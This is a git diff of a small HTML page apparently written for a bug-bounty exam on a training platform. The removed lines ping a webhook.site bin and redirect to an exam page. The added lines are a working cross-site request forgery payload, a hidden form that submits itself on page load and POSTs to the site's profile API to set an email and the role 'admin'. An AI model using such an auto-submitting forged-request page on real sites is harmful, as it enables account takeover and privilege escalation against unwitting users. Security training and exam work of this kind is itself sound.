@@ -1,20 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/view.php?id=69e2a884bee6d6b7c662a00f">
-</head>
-<body>
-<script>
-    // 1. Create a bin on Beeceptor and put the URL here
-    const bin = "https://webhook.site/8498e95e-0517-4bef-a50f-ba3c90c3ecc9"; 
-    const target = "https://bugbounty-exam.hashacademy.co/view.php?id=69e2ab0cbee6d6b7c662a10f";
-
-    // 2. Simple "I am here" ping
-    navigator.sendBeacon(bin + "/?step=github_hit");
-
-    // 3. Force the redirect
-    window.location.replace(target);
-</script>
-    <h1>Redirecting to Exam Portal...</h1>
-</body>
+  <body>
+    <form id="csrf-form" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST" enctype="text/json">
+      <input type="hidden" name="email" value="ladybughunter1@gmail.com" />
+      <input type="hidden" name="role" value="admin" />
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
 </html>
